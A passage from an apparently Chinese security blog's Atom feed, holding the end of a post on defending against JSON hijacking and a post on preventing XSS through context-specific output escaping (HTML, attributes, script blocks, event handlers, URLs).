</code></pre><p>2,referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。</p>
<p>3,token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="external">知道创宇  JSONP 安全攻防技术</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span ]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用转义防御XSS]]></title>
    <link href="http://xdxd.love/2016/03/09/%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E9%98%B2%E5%BE%A1XSS/"/>
    <id>http://xdxd.love/2016/03/09/使用转义防御XSS/</id>
    <published>2016-03-09T07:53:57.000Z</published>
    <updated>2016-03-09T08:26:02.000Z</updated>
    <content type="html"><![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在html标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">HTML标签</span>&gt;</span>[输出]<span class="tag">&lt;/<span class="title">HTML标签</span>&gt;</span>
</code></pre><p>只需要htmlencode即可。更具体是转义掉&lt; &gt; 就可以防止html注入。</p>
<h1 id="输出在普通html属性中">输出在普通html属性中</h1><pre><code><span class="tag">&lt;<span class="title">div</span> <span class="attribute">attr</span>=<span class="value">不可信数据</span>&gt;</span>content<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
</code></pre><p>好的方案应该是把不可信数据用双引号包裹起来，然后对数据进行htmlencode。</p>
<h1 id="在script标签中输出">在script标签中输出</h1><pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> $a=<span class="string">"不可信数据"</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>确保输出变量在引号中，使用javascript编码输入数据。要防止<code>&lt;/script&gt;</code> 截断</p>
<h1 id="输出在on事件中">输出在on事件中</h1><pre><code><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">#</span> <span class="attribute">onlick</span>=<span class="value">"funcA('$var')"</span>&gt;</span> test<span class="tag">&lt;/<span class="title">a</span>&gt;</span>
</code></pre><p>防御：先做javascript编码，再做html编码。因为输出数据位于html标签属性中，浏览器会进行html自解码。</p>
<h1 id="在地址中输出">在地址中输出</h1><p>对协议进行白名单，http或者https，然后对其他部门进行url编码。避免javascript，data uri等伪协议攻击。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在输出的时候防御XSS即对用户输入进行转义，XSS的问题本质上还是代码注入，HTML或者javascript的代码注入，即混淆了用户输入的数据和代码。而解决这个问题，就需要根据用户可控数据具体输出的环境进行恰当的转义。</p>
<h1 id="在html标签中输出">在ht]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
